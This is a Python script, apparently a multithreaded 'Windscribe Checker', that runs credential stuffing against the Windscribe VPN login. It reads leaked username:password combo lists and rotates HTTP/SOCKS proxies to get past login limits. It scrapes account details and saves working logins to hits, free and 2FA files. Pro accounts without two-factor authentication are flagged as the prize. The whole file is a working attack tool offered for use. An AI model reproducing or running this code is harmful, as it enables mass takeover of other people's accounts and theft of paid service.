import os, requests, easygui, time, random, threading, ctypes
from colorama import Fore, init

# Credit to Pycenter by billythegoat356
# Github: https://github.com/billythegoat356/pycenter/
# License: https://github.com/billythegoat356/pycenter/blob/main/LICENSE

def center(var:str, space:int=None): # From Pycenter
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
    
    return "\n".join((' ' * int(space)) + var for var in var.splitlines())

init(convert=True)

class WindScribe:
    def __init__(self):
        self.proxies = []
        self.combos = []
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.cpm = 0  
        self.retries = 0   
        self.lock = threading.Lock()
            
    def ui(self):
        os.system(f'cls && title Windscribe Checker - Made by Plasmonix')
        print(center(f"""{Fore.CYAN}
▄▄▌ ▐ ▄▌▪   ▐ ▄ ·▄▄▄▄  .▄▄ ·  ▄▄· ▄▄▄  ▪  ▄▄▄▄· ▄▄▄ .
██· █▌▐███ •█▌▐███▪ ██ ▐█ ▀. ▐█ ▌▪▀▄ █·██ ▐█ ▀█▪▀▄.▀·
██▪▐█▐▐▌▐█·▐█▐▐▌▐█· ▐█▌▄▀▀▀█▄██ ▄▄▐▀▀▄ ▐█·▐█▀▀█▄▐▀▀▪▄
▐█▌██▐█▌▐█▌██▐█▌██. ██ ▐█▄▪▐█▐███▌▐█•█▌▐█▌██▄▪▐█▐█▄▄▌
 ▀▀▀▀ ▀▪▀▀▀▀▀ █▪▀▀▀▀▀•  ▀▀▀▀ ·▀▀▀ .▀  ▀▀▀▀·▀▀▀▀  ▀▀▀{Fore.RESET}
        {Fore.LIGHTWHITE_EX}\n     github.com/Plasmonix {Fore.CYAN}~{Fore.RESET} discord.gg/Plasmonix\n\n"""))
    
    def cpmCounter(self):
        while True:
            old = self.checked
            time.sleep(4)
            new = self.checked
            self.cpm = (new-old) * 15

    def updateTitle(self):
        while True:
            self.timenow = time.strftime("%H:%M:%S", time.localtime())
            ctypes.windll.kernel32.SetConsoleTitleW(f'Windscribe Checker - Checked: {self.checked} | Hits: {self.hits} | Bad: {self.bad} | CPM: {self.cpm} | Retries: {self.retries} | Threads: {threading.active_count() - 2}')
            time.sleep(0.4)

    def getProxies(self):
        try:
            print(f'[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Proxy path> ')
            path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'WyndScribe - Select proxy', multiple= False)
            open(path, "r", encoding="utf-8") 

            choice = int(input(f'[{Fore.LIGHTBLUE_EX}?{Fore.RESET}] Proxy type [{Fore.LIGHTBLUE_EX}0{Fore.RESET}]HTTPS/[{Fore.LIGHTBLUE_EX}1{Fore.RESET}]SOCKS4/[{Fore.LIGHTBLUE_EX}2{Fore.RESET}]SOCKS5> '))
            
            if choice == 0:
                proxytype = 'https'                          
            elif choice == 1:
                proxytype = 'socks4'
            elif choice == 2:
                proxytype = 'socks5'
            else:
                print(f'[{Fore.RED}!{Fore.RESET}] Please enter a valid choice such as 0, 1 or 2!')
                os.system('pause >nul')
                quit()
            
            with open(path, 'r', encoding="utf-8") as f:
                for l in f:
                    ip = l.split(":")[0]
                    port = l.split(":")[1]
                    self.proxies.append({'http': proxytype+'://'+ip+':'+port.rstrip("\n")})

        except ValueError:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Value must be an integer')
            os.system('pause >nul')
            quit()
       
        except Exception as e:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed to open proxyfile')
            os.system('pause >nul')
            quit()

    def getCombos(self):
        try:
            print(f'[{Fore.LIGHTBLUE_EX}>{Fore.LIGHTWHITE_EX}] Combo path> ')
            path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'WyndScribe - Select combos', multiple= False)
            with open(path, 'r', encoding="utf-8") as f:
                for l in f:
                     self.combos.append(l.replace('\n', ''))
        except:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed to open combofile')
            os.system('pause >nul')
            quit()
        
    def checker(self, username, password):
        try:     
            client = requests.Session()
            req = client.post('https://res.windscribe.com/res/logintoken',headers ={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8','content-length': '0','origin': 'https://windscribe.com','referer': 'https://windscribe.com/','sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',} , proxies =random.choice(self.proxies)).json()
            token = req['csrf_token']
            time = req['csrf_time']
            data = {'login': '1','upgrade': '0','csrf_time': time,'csrf_token': token,'username': username,'password': password,'code': ''}
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding': 'gzip, deflate, br','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-length': '144','content-type': 'application/x-www-form-urlencoded','origin': 'https://windscribe.com','referer': 'https://windscribe.com/login','sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36'}

            res = client.post('https://windscribe.com/login', headers =headers , data =data, proxies =random.choice(self.proxies))
            
            if 'My Account - Windscribe' in res.text:
                profile = client.get('https://windscribe.com/myaccount', proxies =random.choice(self.proxies), timeout=2)
                username = profile.text.split('<h2>Username</h2>\n<span>')[1].split('</span>')[0]
                creation_date = profile.text.split('Account</a></h2>\n<span>')[1].split('</span>')[0]
                account_status = profile.text.split('<span id="ma_account_status">\n<strong>')[1].split('<')[0]
                bandwith = profile.text.split('<h2>Bandwidth Usage</h2>\n<span>')[1].split('</span>')[0]
                bandwith = bandwith.replace('\n', '')
                fa_status = profile.text.split('<span id="ma_account_2fa_status">\n<strong>')[1].split('</strong>')[0]
                comparer = profile.text.replace('"', '')
                
                if 'Disabled' in fa_status and "ma_account_status').html('<i class=ma_green_star></i> <strong>Pro</strong>" in comparer:
                    self.lock.acquire()
                    print(f'[{Fore.LIGHTBLUE_EX}{self.timenow}{Fore.RESET}] {Fore.LIGHTGREEN_EX}HIT{Fore.RESET} | {username} | {password} | {creation_date} | {account_status} | {bandwith}.')                  
                    with open('hits.txt', 'a', encoding='utf-8') as fp:
                        fp.writelines(f'User: {username} Pass: {password} - Creation: {creation_date} - Status: {account_status} - Bandwith: {bandwith}\n')
                    self.checked += 1
                    self.hits += 1
                    self.lock.release()
                    
                elif not "ma_account_status').html('<i class=ma_green_star></i> <strong>Pro</strong>" in comparer and 'Disabled' in fa_status:
                    self.lock.acquire()
                    print(f'[{Fore.LIGHTBLUE_EX}{self.timenow}{Fore.RESET}] {Fore.LIGHTBLUE_EX}FREE{Fore.RESET} | {username} | {password} ') 
                    with open('free.txt', 'a', encoding='utf-8') as fp:
                        fp.writelines(f'{username}:{password}\n')
                    self.checked += 1
                    self.hits += 1
                    self.lock.release()
                    
                elif not 'Disabled' in fa_status:
                    self.lock.acquire()
                    print(f'[{Fore.LIGHTBLUE_EX}{self.timenow}{Fore.RESET}] {Fore.LIGHTBLUE_EX}2FA{Fore.RESET} | {username} | {password} ') 
                    with open('2fa.txt', 'a', encoding='utf-8') as fp:
                        fp.writelines(f'{username}:{password}\n')
                    self.checked += 1
                    self.hits += 1
                    self.lock.release()
                                      
                elif 'Login is not correct' in res.text or 'Login attempt limit reached' in res.text:
                    self.lock.acquire()
                    print(f'[{Fore.LIGHTBLUE_EX}{self.timenow}{Fore.RESET}] {Fore.LIGHTRED_EX}BAD{Fore.RESET} | {username} | {password} ') 
                    self.checked += 1
                    self.bad += 1
                    self.lock.release()
        
        except Exception as e:
                self.lock.acquire()
                print(f'[{Fore.LIGHTBLUE_EX}{self.timenow}{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Proxy timeout. Change your proxies or use a different VPN')
                self.retries += 1
                self.lock.release()
    
    def worker(self, combos, thread_id):
        while self.check[thread_id] < len(combos):
            combination = combos[self.check[thread_id]].split(':')
            self.checker(combination[0], combination[1])
            self.check[thread_id] += 1 

    def main(self):
        self.ui()
        self.getProxies()
        self.getCombos()
        try:
            self.threadcount = int(input(f'[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Threads> '))
        except ValueError:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Value must be an integer')
            os.system('pause >nul')
            quit()
               
        self.ui()
        threading.Thread(target =self.cpmCounter, daemon =True).start()
        threading.Thread(target =self.updateTitle ,daemon =True).start()
        
        threads = []
        self.check = [0 for i in range(self.threadcount)]
        for i in range(self.threadcount):
            sliced_combo = self.combos[int(len(self.combos) / self.threadcount * i): int(len(self.combos)/ self.threadcount* (i+1))]
            t = threading.Thread(target= self.worker, args= (sliced_combo, i,) )
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print(f'[{Fore.LIGHTGREEN_EX}{self.timenow}{Fore.RESET}] Task completed')
        os.system('pause>nul')
        
n = WindScribe()
n.main()
